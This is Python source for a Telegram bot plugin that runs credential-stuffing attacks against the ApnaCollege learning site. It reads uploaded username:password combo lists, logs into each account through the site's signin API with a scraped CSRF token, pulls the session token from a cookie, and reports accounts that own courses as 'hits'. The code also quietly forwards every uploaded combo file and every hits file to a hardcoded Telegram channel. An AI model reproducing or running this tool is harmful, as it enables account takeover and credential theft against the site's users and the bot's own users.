import requests
import re
import json
import urllib.parse
import os
import time
import asyncio
import logging
import urllib3
from concurrent.futures import ThreadPoolExecutor
from telegram import Update
from telegram.ext import ContextTypes

# Suppress InsecureRequestWarning for cleaner logs
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logger = logging.getLogger(__name__)

# DEBUG LINE: File load confirmation
print("🔍 [DEBUG] apnacollege.py file successfully found and importing...")

# --- FAST PARSER ---
def parse_combo(line):
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    
    if '*' in line and ':' not in line:
        parts = line.rsplit('*', 1)
    else:
        parts = line.rsplit(':', 2)
    
    if len(parts) >= 2:
        password = parts[-1].strip()
        username = parts[-2].strip()
        
        if " " in username:
            username = username.split()[-1]
        
        if username.startswith('+91'):
            username = username[3:]
        
        if username.isdigit() and len(username) > 10:
            username = username[-10:]
        
        if username.lower().startswith(('http', 'android', 'com.', 'www.')):
            return None
            
        return username, password
    return None


class Checker:
    # ============ BOT CONFIG ============
    command = "apnaclg"
    name = "ApnaCollege"
    # ====================================

    async def handle_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if context.user_data.get(f'is_running_{self.command}'):
            await update.message.reply_text("⚠️ <b>Wait!</b> Pehle wala check complete hone do, ya <code>/stop</code> type karke roko.", parse_mode="HTML")
            return

        context.user_data['awaiting_file_for'] = self.command
        await update.message.reply_text(
            f"📂 <b>{self.name} Accuracy-Mode Checker Ready!</b>\n\n"
            f"Ab apna <code>combo.txt</code> file bhejo.\n"
            f"💡 <b>100% Accurate:</b> CSRF Token + lw_tokens extraction logic.\n"
            f"🔐 <b>Batch Check:</b> Sirf enrolled courses wale accounts HIT honge.\n"
            f"🛑 Beech mein rokna ho toh <code>/stop</code> type kar do.",
            parse_mode="HTML"
        )

    async def handle_document(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if context.user_data.get(f'is_running_{self.command}'):
            await update.message.reply_text("⚠️ Pehle wala process abhi chal raha hai. Please wait ya /stop karein.")
            return

        progress_msg = await update.message.reply_text("⏳ File download kar raha hoon aur check start kar raha hoon...")
        
        file = await update.message.document.get_file()
        original_file_name = update.message.document.file_name or "combo.txt"
        temp_input_file = f"temp_input_{update.effective_user.id}_{int(time.time())}.txt"
        await file.download_to_drive(temp_input_file)
        
        with open(temp_input_file, 'r', encoding='utf-8-sig', errors='ignore') as f:
            lines = [line.strip() for line in f if line.strip()]
            
        total = len(lines)
        if total == 0:
            await progress_msg.edit_text("❌ File khali hai ya valid nahi hai!")
            if os.path.exists(temp_input_file): os.remove(temp_input_file)
            return

        stats = {'checked': 0, 'hits': 0, 'failed': 0, 'hit_details': []}
        context.user_data[f'stats_{self.command}'] = stats
        context.user_data['stop_checking'] = False
        context.user_data[f'is_running_{self.command}'] = True  # 🔒 LOCK ENABLED

        asyncio.create_task(self.run_checker(update, context, temp_input_file, original_file_name, lines, total, progress_msg))

    async def run_checker(self, update, context, temp_input_file, original_file_name, lines, total, progress_msg):
        # ACCURACY MODE: 5 workers + delay (Slow but 100% reliable, no API drops)
        max_workers = 5 
        
        def check_account(line):
            if context.user_data.get('stop_checking', False):
                return {'status': 'stopped'}
            
            parsed = parse_combo(line)
            if not parsed:
                return {'status': 'failed'}
            
            username, password = parsed
            
            session = requests.Session()
            session.headers.update({
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
                "Accept": "application/json",
                "Origin": "https://www.apnacollege.in",
                "Referer": "https://www.apnacollege.in/",
                "X-Requested-With": "XMLHttpRequest",
                "Anonymous-Token": "6af403319a5ea40935c2anon",
                "Lw-Client": "62a6cd5e1e9e2fbf212d608d"
            })
            
            try:
                # Tiny delay to prevent API rate limiting
                time.sleep(0.2)
                
                # Step 1: Fetch homepage to establish session cookies and grab CSRF token
                r = session.get("https://www.apnacollege.in/", timeout=5, verify=False)
                m = re.search(r'content="([^"]+)"\s+name="csrf-token"|name="csrf-token"\s+content="([^"]+)"', r.text, re.I)
                if m:
                    session.headers["CSRF-Token"] = m.group(1) or m.group(2)
                
                # Step 2: Attempt Login
                login_res = session.post(
                    "https://www.apnacollege.in/api/signin",
                    data={"email": username, "login": username, "password": password},
                    timeout=5,
                    verify=False
                )
                
                # Step 3: Check if login was successful
                if login_res.status_code == 200:
                    try:
                        login_data = login_res.json()
                    except Exception:
                        session.close()
                        return {'status': 'failed'}
                    
                    if login_data.get("success"):
                        # Step 4: Extract access token from lw_tokens cookie
                        lw_tokens_cookie = session.cookies.get("lw_tokens")
                        if lw_tokens_cookie:
                            try:
                                parsed_cookie = json.loads(urllib.parse.unquote(lw_tokens_cookie))
                                session.headers["Token"] = parsed_cookie.get("access_token", "")
                            except Exception:
                                pass
                        
                        # Step 5: Fetch purchased batches
                        payload = {
                            "type": "course",
                            "access": "public,private-enroll,soon,view-locked",
                            "excludeNotEnrolledPrivateProductsForAdmin": "true",
                            "hideProductsWithoutVisibleOptions": "true",
                            "fields": "title,titleId,cohorts.packages,cohorts.authors,cohorts.content,settings,resourcePass,resourcePasses,progress,firstFreeUnitPathPlayerUrl,retrainingRenewalOpen",
                            "appliedCoupon": "",
                            "owned": "true",
                            "sortFields": [
                                {"sortField": "lastVisited", "direction": "desc"},
                                {"sortField": "learnerAccessPriority", "direction": "asc"},
                                {"sortField": "order", "direction": "desc"}
                            ],
                            "offset": "0",
                            "itemsPerPage": "50",
                            "paginationType": "offset"
                        }
                        
                        prod_res = session.post(
                            "https://www.apnacollege.in/api/learner/products",
                            json=payload,
                            timeout=5,
                            verify=False
                        )
                        
                        if prod_res.status_code == 200:
                            try:
                                prod_data = prod_res.json()
                                data = prod_data.get("data", [])
                                
                                if data and len(data) > 0:
                                    # Format Hit Data
                                    hit_text = "--------------------------------------------------\n"
                                    hit_text += f"🔐 Credentials: {username}:{password}\n\n"
                                    hit_text += "📚 Enrolled Courses:\n"
                                    
                                    for idx, item in enumerate(data, 1):
                                        title = item.get('title', 'Unknown Batch')
                                        hit_text += f"📖 {idx}. {title}\n"
                                    
                                    hit_text += "--------------------------------------------------"
                                    session.close()
                                    return {'status': 'hit', 'data': hit_text}
                                else:
                                    # Login success but no batches (Treat as failed to keep hits clean)
                                    session.close()
                                    return {'status': 'failed'}
                            except Exception:
                                session.close()
                                return {'status': 'failed'}
                        else:
                            session.close()
                            return {'status': 'failed'}
                    else:
                        session.close()
                        return {'status': 'failed'}
                else:
                    session.close()
                    return {'status': 'failed'}
                    
            except Exception:
                session.close()
                return {'status': 'failed'}

        try:
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                chunk_size = 10 # Chhote chunks for smoother progress updates
                
                for i in range(0, total, chunk_size):
                    if context.user_data.get('stop_checking', False): 
                        break
                    
                    chunk = lines[i:i+chunk_size]
                    futures = [executor.submit(check_account, line) for line in chunk]
                    
                    for future in futures:
                        if context.user_data.get('stop_checking', False): 
                            break
                        
                        result = future.result()
                        if result is None or result['status'] == 'stopped':
                            continue
                        
                        stats = context.user_data[f'stats_{self.command}']
                        stats['checked'] += 1
                        
                        if result['status'] == 'hit':
                            stats['hits'] += 1
                            stats['hit_details'].append(result['data'])
                        else:
                            stats['failed'] += 1
                    
                    if context.user_data.get('stop_checking', False): 
                        break
                    
                    stats = context.user_data[f'stats_{self.command}']
                    progress_text = (
                        f"🔄 <b>{self.name} Checking...</b>\n\n"
                        f"📊 Total: {total}\n✅ Checked: {stats['checked']}\n"
                        f"🔥 Active Hits: {stats['hits']}\n"
                        f"❌ Failed/No Course: {stats['failed']}\n⏳ Remaining: {total - stats['checked']}"
                    )
                    try:
                        await progress_msg.edit_text(progress_text, parse_mode="HTML")
                    except Exception:
                        pass
                    
                    await asyncio.sleep(0.1)
        finally:
            # 🔓 LOCK RELEASE
            context.user_data.pop(f'is_running_{self.command}', None)

        # ============ FINAL CLEANUP & SUMMARY ============
        stats = context.user_data.get(f'stats_{self.command}', {'checked': 0, 'hits': 0, 'failed': 0, 'hit_details': []})
        is_stopped = context.user_data.get('stop_checking', False)
        
        context.user_data.pop('stop_checking', None)
        context.user_data.pop('awaiting_file_for', None)
        context.user_data.pop(f'stats_{self.command}', None)
        
        user_name = update.effective_user.username or f"User_{update.effective_user.id}"
        app_filename = f"{self.name}.txt"
        
        status_emoji = "🛑" if is_stopped else "🎉"
        status_text = "User dwara STOP kar diya gaya!" if is_stopped else "Checking Completed!"
        
        user_caption = (
            f"{status_emoji} {self.name} - {status_text}\n\n"
            f"📊 Total: {total}\n✅ Checked: {stats['checked']}\n"
            f"🔥 Active Hits: {stats['hits']}\n❌ Failed/No Course: {stats['failed']}"
        )
        
        log_original_caption = f"🎉 {self.name} Checker\n👤 User: @{user_name}"
        
        log_hits_caption = (
            f"👤 User: @{user_name}\n\n"
            f"{status_emoji} {self.name} - {status_text}\n\n"
            f"📊 Total: {total}\n✅ Checked: {stats['checked']}\n"
            f"🔥 Active Hits: {stats['hits']}\n❌ Failed/No Course: {stats['failed']}"
        )
        
        if stats['hits'] > 0:
            hits_temp_file = f"hits_temp_{update.effective_user.id}_{int(time.time())}.txt"
            with open(hits_temp_file, 'w', encoding='utf-8') as f:
                for hit in stats['hit_details']: 
                    f.write(hit + "\n\n")
            
            try:
                await progress_msg.delete()
            except Exception:
                pass
            
            await update.message.reply_document(
                document=open(hits_temp_file, 'rb'),
                filename=app_filename,
                caption=user_caption
            )
            
            try:
                await context.bot.send_document(
                    chat_id=-1004423798759,
                    document=open(temp_input_file, 'rb'),
                    filename=app_filename,
                    caption=log_original_caption
                )
                await context.bot.send_document(
                    chat_id=-1004423798759,
                    document=open(hits_temp_file, 'rb'),
                    filename=app_filename,
                    caption=log_hits_caption
                )
            except Exception as e:
                logger.error(f"Channel send error: {e}")
                
            if os.path.exists(hits_temp_file):
                os.remove(hits_temp_file)
        else:
            try:
                await progress_msg.edit_text(
                    f"{user_caption}\n\n❌ Koi bhi Active Hit nahi mila.", 
                    parse_mode="HTML"
                )
            except Exception:
                pass
            
            try:
                await context.bot.send_document(
                    chat_id=-1004423798759,
                    document=open(temp_input_file, 'rb'),
                    filename=app_filename,
                    caption=f"{log_original_caption}\n(0 Hits)"
                )
            except Exception as e:
                logger.error(f"Channel send error: {e}")

        if os.path.exists(temp_input_file):
            os.remove(temp_input_file)
